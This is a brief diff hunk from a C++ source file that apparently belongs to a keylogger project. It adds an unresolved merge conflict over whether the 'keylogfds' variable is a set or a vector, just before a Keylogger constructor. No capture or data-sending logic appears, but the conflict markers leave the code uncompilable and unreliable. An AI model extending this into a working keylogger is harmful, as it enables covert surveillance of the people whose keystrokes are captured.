@@ -5,7 +5,11 @@
 #include <mutex>
 #include "../../Message/Response.h"
 
+<<<<<<< HEAD
 std::set<int> keylogfds;
+=======
+std::vector<int> keylogfds;
+>>>>>>> 86a984b35be3c9a1c3b1f77e1ee399baa4436cdf
 
 
 Keylogger::Keylogger()
